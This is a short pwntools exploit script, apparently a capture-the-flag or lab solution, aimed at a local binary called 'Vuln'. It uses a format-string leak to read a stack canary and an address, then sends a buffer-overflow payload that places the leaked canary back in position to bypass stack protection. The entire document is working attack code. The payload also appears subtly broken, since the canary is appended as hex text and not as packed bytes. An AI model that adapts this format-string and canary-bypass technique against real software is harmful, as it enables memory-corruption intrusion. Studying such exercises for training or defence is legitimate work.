from pwn import *

p = process("./Vuln")

print(p.recvuntil(":").decode())

p.sendline(b'%p.' * 12)

answer = p.recvuntil("?").decode()

address = answer.split('.')[6].encode()

Pcanary = answer.split('.')[2]

canary = Pcanary.encode()

print(answer)

print("Address found: " + address.decode())

print(hex(int(canary, 16)))
print(canary)

payload = b'A' * 20 + canary + b'A'*6 + address 
p.sendline(payload)

print(p.recvall())